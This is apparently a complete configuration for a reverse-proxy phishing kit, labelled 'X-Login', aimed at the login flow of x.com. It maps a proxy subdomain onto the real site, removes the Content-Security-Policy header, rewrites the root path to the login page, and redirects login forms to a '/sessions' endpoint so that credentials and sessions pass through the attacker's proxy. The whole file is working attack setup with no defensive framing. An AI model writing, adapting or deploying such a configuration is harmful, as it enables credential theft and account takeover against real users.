name: "X-Login"
author: "Vanta v5"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "x"
    target: "x.com"
auth_urls: ["/i/flow/login"]
landing_path: ["/i/flow/login"]
auth_tokens: []
credentials: []
injections: []
headers:
  - {action: "remove", name: "Content-Security-Policy"}
path_rewrites:
  - {pattern: "^/$", replace: "/i/flow/login", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "analytics|gtm|/static/", mimes: ["text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action*=\"login\"], form[data-testid*=\"Login\"]", action_to: "/sessions"}
